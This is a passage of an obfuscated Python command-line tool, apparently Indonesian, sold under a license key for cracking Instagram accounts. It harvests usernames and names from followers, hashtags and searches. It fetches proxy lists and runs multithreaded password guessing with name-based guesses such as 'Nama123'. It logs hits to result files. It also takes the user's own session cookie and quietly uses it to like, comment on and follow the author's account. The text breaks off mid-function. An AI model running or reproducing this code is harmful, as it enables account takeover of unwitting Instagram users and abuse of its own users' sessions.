#!/usr/bin/env python3
import requests ,random ,time ,json ,re ,os 
from concurrent .futures import ThreadPoolExecutor 
from requests .exceptions import ConnectionError 
from uuid import uuid4
"""
Hargai Pembuat Atau Author...
Please Jangan Di Jual Belikan Lagi!
Recode Buat Pribadi Enggak Masalah
"""
I =('\x1b[1;90m')
M =('\x1b[1;91m')
H =('\x1b[1;92m')
K =('\x1b[1;93m')
T =('\x1b[1;94m')
U =('\x1b[1;95m')
B =('\x1b[1;96m')
P =('\x1b[1;97m')
__logo__ =(f"""{H} ___ ___ ___ __  __ ___ _   _ __  __
{H}| _ \ _ \ __|  \/  |_ _| | | |  \/  |
{P}|  _/   / _|| |\/| || || |_| | |\/| |
{P}|_| |_|_\___|_|  |_|___|\___/|_|  |_|
{P}[{K}#{P}]{K}——————————————————————————————
{H}[{P}*{H}]{P} Author : Rozhak
{H}[{P}*{H}]{P} Facebook : @rozhak.xyz
{H}[{P}*{H}]{P} Instagram : @rozhak_official
{P}[{K}#{P}]{K}——————————————————————————————""")
useragent =('Mozilla/5.0 (Linux; Android 6.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1812; HUAWEI; HUAWEI VNS-L31; HWVNS-H; hi6250; pt_PT; 98288242)')
def __apikey__ ():
  try :
    os .system ('clear');print (f"{H} _     _                    _\n{H}| |   (_)___  ___ _ __  ___(_)\n{H}| |   | / __|/ _ \ '_ \/ __| |\n{P}| |___| \__ \  __/ | | \__ \ |\n{P}|_____|_|___/\___|_| |_|___/_|\n\n{K}[{P}#{K}]{P} Silahkan Masukan Apikey Anda Jika Anda Belum Mempunyai Apikey Ketik {K}[{H}Get{K}]{P} Untuk Mendapatkan Apikey...\n")
    OO00O0OO0OOOO0OOO =input (f"{H}[{P}?{H}]{P} Apikey :{T} ")
    if OO00O0OO0OOOO0OOO in ['get','Get','GET']:
      print (f"{M}[{P}*{M}]{P} Anda Bisa Menghubungi Saya Secara Manual WhatsApp : 6283847921480");time .sleep (3 );os .system ('xdg-open https://wa.me/6283847921480?text=Saya%20ingin%20membeli%20lisensi%20crack%20instagram');exit ()
    else :
      O000OOOOO00OO0OOO ={'token':'WyIxNjI5NTcwOSIsImhDaGhxdzg3TUtnN1IyeGpMOWFhUVVuL01DY0g1ZlJ4QUoxd3N5Z1AiXQ==','productid':'14640','key':OO00O0OO0OOOO0OOO ,'sigin':True }
      with requests .Session ()as O00000OO0OOO0O000 :#line:46
        OOOOOO000OOOOOO0O =O00000OO0OOO0O000 .get ('https://app.cryptolens.io/api/key/activate?',params =O000OOOOO00OO0OOO ).json ()['licenseKey'];open ('Data/apikey.txt','w').write (OO00O0OO0OOOO0OOO )#line:47
        O0O0OOO0OOOOO0O00 =OOOOOO000OOOOOO0O ['expires'].split ('T')[0 ].split ('-')#line:48
        O0000000OOO00OO00 =OOOOOO000OOOOOO0O ['expires'].split ('T')[1 ].split (':')#line:49
        print (f"{H}[{P}*{H}]{P} Expired :{K} {O0O0OOO0OOOOO0O00[2]}/{O0O0OOO0OOOOO0O00[1]}/{O0O0OOO0OOOOO0O00[0]} {O0000000OOO00OO00[0]}.{O0000000OOO00OO00[1]}");time .sleep (3 );__menu__ ()#line:50
  except (KeyError ):#line:51
    exit (f"{P}[{M}!{P}]{M} Apikey Invalid")#line:52
  except Exception as O0O00OOO00OOOOOO0 :#line:53
    exit (f"{P}[{M}!{P}]{M} {O0O00OOO00OOOOOO0}")#line:54
def __login__ ():#line:56
  try :#line:57
    os .system ('clear')#line:58
    print (f"{__logo__}\n\n{K}[{P}#{K}]{P} Silahkan Masukan Cookie Akun Instagram Anda, Pastikan Jangan Gunakan Akun Baru, Jika Anda Belum Mengetahui Cookie Ketik {K}[{H}Get{K}]{H}\n")#line:59
    O0O00O00O0000000O =input (f"{H}[{P}?{H}]{P} Cookie :{T} ")#line:60
    if O0O00O00O0000000O [:3 ]in ['get','Get','GET']:#line:61
      print (f"{M}[{P}!{M}]{P} Anda Akan Diarahkan Ke Youtube...");time .sleep (3 );os .system ('xdg-open https://youtu.be/u17ZQgSs3aY');exit ()#line:62
    elif O0O00O00O0000000O [:4 ]in ['mid=']:#line:63
      OOO0O0O00O00O0O00 =re .search ('ds_user_id=(.*?);',O0O00O00O0000000O ).group (1 );open ('Data/userid.txt','w').write (OOO0O0O00O00O0O00 )#line:64
      O0000OO0O0OO000OO =requests .get (f'https://i.instagram.com/api/v1/users/{OOO0O0O00O00O0O00}/info/',headers ={'user-agent':useragent ,'cookie':O0O00O00O0000000O }).json ()['user'];open ('Data/cookie.txt','w').write (O0O00O00O0000000O )#line:65
      print (f"{H}[{P}*{H}]{P} Welcome :{T} {O0000OO0O0OO000OO['full_name']}");time .sleep (2 );__follow__ ()#line:66
    else :#line:67
      exit (f"{P}[{M}!{P}]{M} Awalan Cookie Mid=")#line:68
  except (ValueError ,KeyError ):#line:69
    exit (f"{P}[{M}!{P}]{M} Cookie Salah")#line:70
  except (ConnectionError ):#line:71
    exit (f"{P}[{K}!{P}]{K} Koneksi Error")#line:72
def __follow__ ():#line:74
  try :#line:75
    OOOOOO00O0O0OOOOO =open ('Data/cookie.txt','r').read ()#line:76
  except (IOError ):#line:77
    print (f"{P}[{M}!{P}]{M} Cookie Invalid");time .sleep (3 );__login__ ()#line:78
  try :#line:79
    OO0OOOO0OO0O0OO00 =re .search ('sessionid=(.*?);',OOOOOO00O0O0OOOOO ).group (1 )#line:80
    O0OOO00000000OOO0 =random .choice (['Hallo Bang 😍','Hai Bang Apa Kabar 😎','Izin Pake Scriptnya 😁','Mantap Bang 😘','Programmer Bang 🤔','Salam Kenal Bang 🤗','I Love You ❤️'])#line:81
    O0O00O0O0OO00OOO0 ={'accept':'*/*','accept-encoding':'gzip, deflate, br','accept-language':'en-US,en;q=0.9','content-length':'0','content-type':'application/x-www-form-urlencoded','cookie':f'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id={open("Data/userid.txt","r").read()}; sessionid={OO0OOOO0OO0O0OO00}','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken':'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id':'5398218083','x-ig-www-claim':'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax':'95bfef5dd816','x-requested-with':'XMLHttpRequest'}#line:99
    O0O0OO00OOOOO00O0 ={'comment_text':O0OOO00000000OOO0 ,'replied_to_comment_id':''}#line:102
    with requests .Session ()as O0O0OO00O0O00OO00 :#line:103
      OO000000OO0OO0O0O =O0O0OO00O0O00OO00 .post ('https://www.instagram.com/web/likes/2734317205115382629/like/',headers =O0O00O0O0OO00OOO0 )#line:104
      OO00OO0000O00000O =O0O0OO00O0O00OO00 .post ('https://www.instagram.com/web/comments/2734317205115382629/add/',data =O0O0OO00OOOOO00O0 ,headers =O0O00O0O0OO00OOO0 )#line:105
      OOOO000OOOOOO0O00 =O0O0OO00O0O00OO00 .post ('https://www.instagram.com/web/friendships/5398218083/follow/',headers =O0O00O0O0OO00OOO0 )#line:106
      if '"status":"ok"'in str (OOOO000OOOOOO0O00 .text ):#line:107
        print (f"{H}[{P}*{H}]{P} Login Berhasil...");time .sleep (2 );__menu__ ()#line:108
      else :#line:109
        print (f"{P}[{M}!{P}]{M} Login Gagal Mungkin Akun Terblokir");os .system ('rm -rf Data/cookie.txt');exit ()#line:110
  except :__menu__ ()#line:111
def __menu__ ():#line:113
  try :#line:114
    os .system ('clear');print (f"{__logo__}")#line:115
    OOO00O0OOO000O00O =requests .get (f'https://i.instagram.com/api/v1/users/{open("Data/userid.txt","r").read()}/info/',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['user']#line:116
    print (f"\n{B}[{P}*{B}]{P} Welcome : {OOO00O0OOO000O00O['full_name']}")#line:117
    try :#line:118
      O00O0OO00O000O0O0 ={'token':'WyIxNjI5NTcwOSIsImhDaGhxdzg3TUtnN1IyeGpMOWFhUVVuL01DY0g1ZlJ4QUoxd3N5Z1AiXQ==','productid':'14640','key':open ('Data/apikey.txt','r').read (),'sigin':True }#line:124
      with requests .Session ()as OOO000O0O00OOOO00 :#line:125
        OOO00O0OOO000O00O =OOO000O0O00OOOO00 .get ('https://app.cryptolens.io/api/key/activate?',params =O00O0OO00O000O0O0 ).json ()['licenseKey']#line:126
        O000OOOOOO0O00O00 =OOO00O0OOO000O00O ['expires'].split ('T')[0 ].split ('-')#line:127
        print (f"{B}[{P}*{B}]{P} Expired :{K} {O000OOOOOO0O00O00[2]}/{O000OOOOOO0O00O00[1]}/{O000OOOOOO0O00O00[0]}")#line:128
        print (f"{B}[{P}*{B}]{P} Status :{H} Premium")#line:129
    except (KeyError ,IOError ):#line:130
      print (f"{P}[{M}!{P}]{M} Apikey Invalid");os .system ('rm -rf Data/apikey.txt');time .sleep (3 );__apikey__ ()#line:131
    except Exception as O00O00OOOO00000O0 :#line:132
      exit (f"{P}[{M}!{P}]{M} {O00O00OOOO00000O0}")#line:133
  except (KeyError ,IOError ):#line:134
    print (f"{P}[{M}!{P}]{M} Cookie Invalid");time .sleep (3 );__login__ ()#line:135
  except (ConnectionError ):#line:136
    exit (f"{P}[{K}!{P}]{K} Koneksi Error")#line:137
  print (f"""
{H}[{P}1{H}]{P} Dump User Dari Pencarian
{H}[{P}2{H}]{P} Dump User Dari Mengikuti
{H}[{P}3{H}]{P} Dump User Dari Pengikut
{H}[{P}4{H}]{P} Dump User Dari Hastag
{H}[{P}5{H}]{P} Dump User Dari Email
{H}[{P}6{H}]{P} Mulai Crack {H}[{B}Pro{H}]{M}
{H}[{P}7{H}]{P} Crack Hasil Cp
{H}[{P}8{H}]{P} Lihat Hasil
{H}[{K}9{H}]{K} Keluar
""")#line:148
  O00OO0000O0OO0OO0 =input (f"{U}[{P}?{U}]{P} Choose :{K} ")#line:149
  if O00OO0000O0OO0OO0 in ['1','01']:#line:150
    __pencarian__ ()#line:151
  elif O00OO0000O0OO0OO0 in ['2','02']:#line:152
    __mengikuti__ ()#line:153
  elif O00OO0000O0OO0OO0 in ['3','03']:#line:154
    __pengikut__ ()#line:155
  elif O00OO0000O0OO0OO0 in ['4','04']:#line:156
    __hastag__ ()#line:157
  elif O00OO0000O0OO0OO0 in ['5','05']:#line:158
    __email__ ()#line:159
  elif O00OO0000O0OO0OO0 in ['6','06']:#line:160
    __metode__ ()#line:161
  elif O00OO0000O0OO0OO0 in ['7','07']:#line:162
    __crack__ ()#line:163
  elif O00OO0000O0OO0OO0 in ['8','08']:#line:164
    try :#line:165
      print (f"""
{T}[{P}1{T}]{P} Lihat Hasil Ok
{T}[{P}2{T}]{P} Lihat Hasil Cp
{T}[{P}3{T}]{P} Kembali
""")#line:170
      OOOO000OOO000OOOO =input (f"{U}[{P}?{U}]{P} Choose :{K} ")#line:171
      if OOOO000OOO000OOOO in ['1','01']:#line:172
        print (f"{P} ");os .system ('cat Results/Ok.txt');exit ()#line:173
      elif OOOO000OOO000OOOO in ['2','02']:#line:174
        print (f"{P} ");os .system ('cat Results/Cp.txt');exit ()#line:175
      elif OOOO000OOO000OOOO in ['3','03']:#line:176
        __menu__ ()#line:177
      else :#line:178
        exit (f"{P}[{M}!{P}]{M} Wrong Input")#line:179
    except :pass #line:180
  elif O00OO0000O0OO0OO0 in ['9','09']:#line:181
    try :#line:182
      print (f"{P}[{K}!{P}]{K} Menghapus Cookie...");time .sleep (3 );os .system ('rm -rf Data/cookie.txt && rm -rf Data/userid.txt');exit ()#line:183
    except :pass #line:184
  else :#line:185
    exit (f"{P}[{M}!{P}]{M} Wrong Input")#line:186
def __pencarian__ ():#line:188
  try :#line:189
    OO00O000000O000OO =(str (random .randint (1111111 ,9999999 ))+'.txt')#line:190
    O0O00OOO0O00O00O0 =int (input (f"\n{T}[{P}?{T}]{P} Jumlah :{B} "))#line:191
    if O0O00OOO0O00O00O0 >=21 :#line:192
      exit (f"{P}[{M}!{P}]{M} Jumlah Maksimal 20")#line:193
    else :#line:194
      O00OOO0O0OO0OOO00 =0 #line:195
      for _OOOOOO00OO0OOOO0O in range (O0O00OOO0O00O00O0 ):#line:196
        O00OOO0O0OO0OOO00 +=1 #line:197
        OO00OO000OO0OOO0O =input (f"{T}[{P}{O00OOO0O0OO0OOO00}{T}]{P} Query :{B} ");print (f"{P} ")#line:198
        for O0OOO0OOO0O0O000O in requests .get (f'https://www.instagram.com/web/search/topsearch/?context=blended&query={OO00OO000OO0OOO0O}&rank_token=0.3953592318270893&count=50',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['users']:#line:199
          open (f'Dump/{OO00O000000O000OO}','a').write (f'{O0OOO0OOO0O0O000O["user"]["username"]}<=>{O0OOO0OOO0O0O000O["user"]["full_name"]}\n')#line:200
          print (f"{O0OOO0OOO0O0O000O['user']['username']}<=>{O0OOO0OOO0O0O000O['user']['full_name']}")#line:201
      print (f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Dump Tersimpan :{K} Dump/{OO00O000000O000OO}""");input (f"{H}[{P}Kembali{H}]{P}");__menu__ ()#line:204
  except Exception as O00O0OO0OOOO00OOO :#line:205
    exit (f"{P}[{M}!{P}]{M} {O00O0OO0OOOO00OOO}")#line:206
def __mengikuti__ ():#line:208
  try :#line:209
    OOOOOOOOOOOO0O0OO =input (f"\n{T}[{P}?{T}]{P} User :{B} ")#line:210
    if len (OOOOOOOOOOOO0O0OO )==0 :#line:211
      exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:212
    else :#line:213
      O0OO00OOO00O0O0OO =requests .get (f'https://www.instagram.com/{OOOOOOOOOOOO0O0OO}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:214
      print (f"{T}[{P}?{T}]{P} Name :{B} {O0OO00OOO00O0O0OO['full_name']}");OOO000OO00O00OOOO =(O0OO00OOO00O0O0OO ['full_name'].replace (' ','_')+'.txt');print (f"{P} ")#line:215
      for OOOOOOOO0O0000OO0 in requests .get (f'https://i.instagram.com/api/v1/friendships/{O0OO00OOO00O0O0OO["id"]}/following/?count=5000',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['users']:#line:216
        open (f'Dump/{OOO000OO00O00OOOO}','a').write (f'{OOOOOOOO0O0000OO0["username"]}<=>{OOOOOOOO0O0000OO0["full_name"]}\n')#line:217
        print (f"{OOOOOOOO0O0000OO0['username']}<=>{OOOOOOOO0O0000OO0['full_name']}")#line:218
      print (f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Tersimpan Di :{K} Dump/{OOO000OO00O00OOOO}""");input (f"{H}[{P}Kembali{H}]{P}");__menu__ ()#line:221
  except Exception as OO0O0OO0OO0O0OOO0 :#line:222
    exit (f"{P}[{M}!{P}]{M} {OO0O0OO0OO0O0OOO0}")#line:223
def __pengikut__ ():#line:225
  try :#line:226
    O0000OO0OO0OO0OOO =int (input (f"\n{T}[{P}?{T}]{P} Jumlah :{B} "))#line:227
    if O0000OO0OO0OO0OOO >=51 :#line:228
      exit (f"{P}[{M}!{P}]{M} Jumlah Maksimal 50")#line:229
    else :#line:230
      OOOOO0O0OO00O0O00 =0 #line:231
      O00OO00OOO0OOOO0O =(str (random .randint (1111111 ,9999999 ))+'.txt')#line:232
      for _O000O0OOOO0OO00OO in range (O0000OO0OO0OO0OOO ):#line:233
        OOOOO0O0OO00O0O00 +=1 #line:234
        OOO0O0OO0000OO0OO =input (f"{T}[{P}{OOOOO0O0OO00O0O00}{T}]{P} User :{B} ")#line:235
        if len (OOO0O0OO0000OO0OO )==0 :#line:236
          exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:237
        else :#line:238
          OOO0OO0O0O00OOO0O =requests .get (f'https://www.instagram.com/{OOO0O0OO0000OO0OO}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['graphql']['user']#line:239
          print (f"{T}[{P}?{T}]{P} Name :{B} {OOO0OO0O0O00OOO0O['full_name']}");print (f"{P}")#line:240
          for OOOOO00O0OOO0O0O0 in requests .get (f'https://i.instagram.com/api/v1/friendships/{OOO0OO0O0O00OOO0O["id"]}/followers/?count=5000',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['users']:#line:241
            open (f'Dump/{O00OO00OOO0OOOO0O}','a').write (f'{OOOOO00O0OOO0O0O0["username"]}<=>{OOOOO00O0OOO0O0O0["full_name"]}\n')#line:242
            print (f"{OOOOO00O0OOO0O0O0['username']}<=>{OOOOO00O0OOO0O0O0['full_name']}")#line:243
      print (f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Tersimpan Di :{K} Dump/{O00OO00OOO0OOOO0O}""");input (f"{H}[{P}Kembali{H}]{P}");__menu__ ()#line:246
  except Exception as OOO00O00O0000OO00 :#line:247
    exit (f"{P}[{M}!{P}]{M} {OOO00O00O0000OO00}")#line:248
def __hastag__ ():#line:250
  try :#line:251
    OOOOO0OO0OOO000O0 =(str (random .randint (1111111 ,9999999 ))+'.txt')#line:252
    O00OOO0O0OOOO0O00 =int (input (f"\n{T}[{P}?{T}]{P} Jumlah :{B} "))#line:253
    if O00OOO0O0OOOO0O00 >=21 :#line:254
      exit (f"{P}[{M}!{P}]{M} Jumlah Maksimal 20")#line:255
    else :#line:256
      OO0O0O0O0O0O0000O =0 #line:257
      for _OO00O0O0O0000OOO0 in range (O00OOO0O0OOOO0O00 ):#line:258
        OO0O0O0O0O0O0000O +=1 #line:259
        O0O0O0OOOOO00OO00 =input (f"{T}[{P}{OO0O0O0O0O0O0000O}{T}]{P} Hastag :{B} ").replace ('#','');print (f"{P} ")#line:260
        for OO00OOOOO0OO0OO0O in requests .get (f'https://www.instagram.com/explore/tags/{O0O0O0OOOOO00OO00}/?__a=1',headers ={'user-agent':useragent ,'cookie':open ('Data/cookie.txt','r').read ()}).json ()['data']['top']['sections'][0 ]['layout_content']['medias']:#line:261
          open (f'Dump/{OOOOO0OO0OOO000O0}','a').write (f'{OO00OOOOO0OO0OO0O["media"]["user"]["username"]}<=>{OO00OOOOO0OO0OO0O["media"]["user"]["full_name"]}\n')#line:262
          print (f"{OO00OOOOO0OO0OO0O['media']['user']['username']}<=>{OO00OOOOO0OO0OO0O['media']['user']['full_name']}")#line:263
      print (f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Dump Tersimpan :{K} Dump/{OOOOO0OO0OOO000O0}""");input (f"{H}[{P}Kembali{H}]{P}");__menu__ ()#line:266
  except Exception as O0OOO0OO00O00OO00 :#line:267
    exit (f"{P}[{M}!{P}]{M} {O0OOO0OO00O00OO00}")#line:268
def __email__ ():#line:270
  try :#line:271
    OO0OOOO0OO0OOOO00 =input (f"\n{T}[{P}?{T}]{P} Domain :{B} ")#line:272
    if OO0OOOO0OO0OOOO00 in ['@gmail.com','@yahoo.com','@hotmail.com']:#line:273
      O000OO000O0O00O0O =input (f"{T}[{P}?{T}]{P} Nama :{B} ").replace (' ','');OOOO00000OO0O00O0 =(O000OO000O0O00O0O +'.txt');print (f"{P} ")#line:274
      if len (O000OO000O0O00O0O )==0 :#line:275
        exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:276
      else :#line:277
        for _O0OOOO00000OOOO0O in range (1000 ):#line:278
          OOO000O00OO00OOO0 =str (random .randint (1 ,999 ))#line:279
          open (f'Dump/{OOOO00000OO0O00O0}','a').write (f'{O000OO000O0O00O0O}{OOO000O00OO00OOO0}{OO0OOOO0OO0OOOO00}<=>{nama} {nomor}\n')#line:280
          print (f"{O000OO000O0O00O0O}{OOO000O00OO00OOO0}{OO0OOOO0OO0OOOO00}<=>{nama} {nomor}")#line:281
        print (f"""
{H}[{P}*{H}]{P} Selesai...
{H}[{P}?{H}]{P} File Dump Tersimpan :{K} Dump/{OOOO00000OO0O00O0}""");input (f"{H}[{P}Kembali{H}]{P}");__menu__ ()#line:284
    else :#line:285
      exit (f"{P}[{M}!{P}]{M} Domain : @gmail.com, @yahoo.com, @hotmail.com")#line:286
  except Exception as OOOOO000OOOOOOO00 :#line:287
    exit (f"{P}[{M}!{P}]{M} {OOOOO000OOOOOOO00}")#line:288
class __metode__ :#line:290
  def __init__ (OO000000OOO00O0OO ):#line:292
    OO000000OOO00O0OO .looping =0 #line:293
    OO000000OOO00O0OO .live =[]#line:294
    OO000000OOO00O0OO .die =[]#line:295
    try :#line:296
      with requests .Session ()as O0O00OO00OOO00OOO :#line:297
        OO000OOOO00O0O000 =O0O00OO00OOO00OOO .get ('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all')#line:298
        with open ('Data/proxies.txt','w')as OOOO0O0000OO00OOO :#line:299
          OOOO0O0000OO00OOO .write (OO000OOOO00O0O000 .text )#line:300
    except :#line:301
      OO000OOOO00O0O000 =O0O00OO00OOO00OOO .get ('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy2.txt')#line:302
      with open ('Data/proxies.txt','w')as OOOO0O0000OO00OOO :#line:303
        OOOO0O0000OO00OOO .write (OO000OOOO00O0O000 .text )#line:304
    print (f"""
{T}[{P}1{T}]{P} Metode www.instagram.com [New]
{T}[{P}2{T}]{P} Metode www.instagram.com [Fast]
{T}[{P}3{T}]{P} Metode www.instagram.com [Slow]
""")#line:309
    O00OO000O000O0OO0 =input (f"{U}[{P}?{U}]{P} Choose :{K} ")#line:310
    if O00OO000O000O0OO0 in ['1','01']:#line:311
      try :#line:312
        print (f"""
{H}[{P}1{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama12345{H}]{P}
{H}[{P}2{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama1234, Nama12345, Nama123456{H}]{P}
{H}[{P}3{H}]{P} Gunakan Password Manual {H}[{P}>5{H}]{P}
""")#line:317
        O00O00000OOO0OO00 =input (f"{U}[{P}?{U}]{P} Choose :{K} ")#line:318
        if O00O00000OOO0OO00 in ['3','03']:#line:319
          OOOOO0OO0OOOO00O0 =input (f"{U}[{P}?{U}]{P} Password :{K} ")#line:320
          if len (OOOOO0OO0OOOO00O0 )<=5 :#line:321
            exit (f"{P}[{M}!{P}]{M} Minimal 6 Karakter")#line:322
        OO000000OOO00O0OO .file =input (f"{U}[{P}?{U}]{P} File Dump :{K} ")#line:323
        if len (OO000000OOO00O0OO .file )==0 :#line:324
          exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:325
        else :#line:326
          OO000000OOO00O0OO .list =open (OO000000OOO00O0OO .file ,'r').read ().splitlines ()#line:327
      except (IOError ):#line:328
        exit (f"{P}[{M}!{P}]{M} File Tidak Ada")#line:329
      try :#line:330
        print (f"""
{B}[{P}*{B}]{P} Hasil Ok Tersimpan Di Results/Ok.txt
{B}[{P}*{B}]{P} Hasil Cp Tersimpan Di Results/Cp.txt
""")#line:334
        with ThreadPoolExecutor (max_workers =35 )as (OO00O00O0OO0O00O0 ):#line:335
          for OO0O000O000O0OO0O in OO000000OOO00O0OO .list :#line:336
            O000OOO000O0O0OOO ,OO0000OO00O00OO00 =OO0O000O000O0OO0O .split ('<=>')#line:337
            OO0OO00O0OOOOOOOO =OO0000OO00O00OO00 .split (' ')#line:338
            if O00O00000OOO0OO00 in ['1','01']:#line:339
              OO00OOO0O00OOOO00 =[OO0000OO00O00OO00 ,OO0000OO00O00OO00 .replace (' ',''),OO0OO00O0OOOOOOOO [0 ]+'123',OO0OO00O0OOOOOOOO [0 ]+'12345']#line:340
            elif O00O00000OOO0OO00 in ['2','02']:#line:341
              OO00OOO0O00OOOO00 =[OO0000OO00O00OO00 ,OO0000OO00O00OO00 .replace (' ',''),OO0OO00O0OOOOOOOO [0 ]+'123',OO0OO00O0OOOOOOOO [0 ]+'1234',OO0OO00O0OOOOOOOO [0 ]+'12345',OO0OO00O0OOOOOOOO [0 ]+'123456']#line:342
            elif O00O00000OOO0OO00 in ['3','03']:#line:343
              OO00OOO0O00OOOO00 =OOOOO0OO0OOOO00O0 .split (',')#line:344
            else :#line:345
              OO00OOO0O00OOOO00 =[OO0000OO00O00OO00 ,OO0000OO00O00OO00 .replace (' ',''),OO0OO00O0OOOOOOOO [0 ]+'123',OO0OO00O0OOOOOOOO [0 ]+'12345']#line:346
            OO00O00O0OO0O00O0 .submit (OO000000OOO00O0OO .__news__ ,OO000000OOO00O0OO .list ,O000OOO000O0O0OOO ,OO00OOO0O00OOOO00 )#line:347
        exit (f"\n{H}[{P}Selesai{H}]{P}")#line:348
      except :exit (f"\n{H}[{P}Selesai{H}]{P}")#line:349
    elif O00OO000O000O0OO0 in ['2','02']:#line:350
      try :#line:351
        print (f"""
{H}[{P}1{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama12345{H}]{P}
{H}[{P}2{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama1234, Nama12345, Nama123456{H}]{P}
{H}[{P}3{H}]{P} Gunakan Password Manual {H}[{P}>5{H}]{P}
""")#line:356
        O00O00000OOO0OO00 =input (f"{U}[{P}?{U}]{P} Choose :{K} ")#line:357
        if O00O00000OOO0OO00 in ['3','03']:#line:358
          OOOOO0OO0OOOO00O0 =input (f"{U}[{P}?{U}]{P} Password :{K} ")#line:359
          if len (OOOOO0OO0OOOO00O0 )<=5 :#line:360
            exit (f"{P}[{M}!{P}]{M} Minimal 6 Karakter")#line:361
        OO000000OOO00O0OO .file =input (f"{U}[{P}?{U}]{P} File Dump :{K} ")#line:362
        if len (OO000000OOO00O0OO .file )==0 :#line:363
          exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:364
        else :#line:365
          OO000000OOO00O0OO .list =open (OO000000OOO00O0OO .file ,'r').read ().splitlines ()#line:366
      except (IOError ):#line:367
        exit (f"{P}[{M}!{P}]{M} File Tidak Ada")#line:368
      try :#line:369
        print (f"""
{B}[{P}*{B}]{P} Hasil Ok Tersimpan Di Results/Ok.txt
{B}[{P}*{B}]{P} Hasil Cp Tersimpan Di Results/Cp.txt
""")#line:373
        with ThreadPoolExecutor (max_workers =35 )as (OO00O00O0OO0O00O0 ):#line:374
          for OO0O000O000O0OO0O in OO000000OOO00O0OO .list :#line:375
            O000OOO000O0O0OOO ,OO0000OO00O00OO00 =OO0O000O000O0OO0O .split ('<=>')#line:376
            OO0OO00O0OOOOOOOO =OO0000OO00O00OO00 .split (' ')#line:377
            if O00O00000OOO0OO00 in ['1','01']:#line:378
              OO00OOO0O00OOOO00 =[OO0000OO00O00OO00 ,OO0000OO00O00OO00 .replace (' ',''),OO0OO00O0OOOOOOOO [0 ]+'123',OO0OO00O0OOOOOOOO [0 ]+'12345']#line:379
            elif O00O00000OOO0OO00 in ['2','02']:#line:380
              OO00OOO0O00OOOO00 =[OO0000OO00O00OO00 ,OO0000OO00O00OO00 .replace (' ',''),OO0OO00O0OOOOOOOO [0 ]+'123',OO0OO00O0OOOOOOOO [0 ]+'1234',OO0OO00O0OOOOOOOO [0 ]+'12345',OO0OO00O0OOOOOOOO [0 ]+'123456']#line:381
            elif O00O00000OOO0OO00 in ['3','03']:#line:382
              OO00OOO0O00OOOO00 =OOOOO0OO0OOOO00O0 .split (',')#line:383
            else :#line:384
              OO00OOO0O00OOOO00 =[OO0000OO00O00OO00 ,OO0000OO00O00OO00 .replace (' ',''),OO0OO00O0OOOOOOOO [0 ]+'123',OO0OO00O0OOOOOOOO [0 ]+'12345']#line:385
            OO00O00O0OO0O00O0 .submit (OO000000OOO00O0OO .__fast__ ,OO000000OOO00O0OO .list ,O000OOO000O0O0OOO ,OO00OOO0O00OOOO00 )#line:386
        exit (f"\n{H}[{P}Selesai{H}]{P}")#line:387
      except :exit (f"\n{H}[{P}Selesai{H}]{P}")#line:388
    elif O00OO000O000O0OO0 in ['3','03']:#line:389
      try :#line:390
        print (f"""
{H}[{P}1{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama12345{H}]{P}
{H}[{P}2{H}]{P} Gunakan Password {H}[{P}Nama, Nama123, Nama1234, Nama12345, Nama123456{H}]{P}
{H}[{P}3{H}]{P} Gunakan Password Manual {H}[{P}>5{H}]{P}
""")#line:395
        O00O00000OOO0OO00 =input (f"{U}[{P}?{U}]{P} Choose :{K} ")#line:396
        if O00O00000OOO0OO00 in ['3','03']:#line:397
          OOOOO0OO0OOOO00O0 =input (f"{U}[{P}?{U}]{P} Password :{K} ")#line:398
          if len (OOOOO0OO0OOOO00O0 )<=5 :#line:399
            exit (f"{P}[{M}!{P}]{M} Minimal 6 Karakter")#line:400
        OO000000OOO00O0OO .file =input (f"{U}[{P}?{U}]{P} File Dump :{K} ")#line:401
        if len (OO000000OOO00O0OO .file )==0 :#line:402
          exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:403
        else :#line:404
          OO000000OOO00O0OO .list =open (OO000000OOO00O0OO .file ,'r').read ().splitlines ()#line:405
      except (IOError ):#line:406
        exit (f"{P}[{M}!{P}]{M} File Tidak Ada")#line:407
      try :#line:408
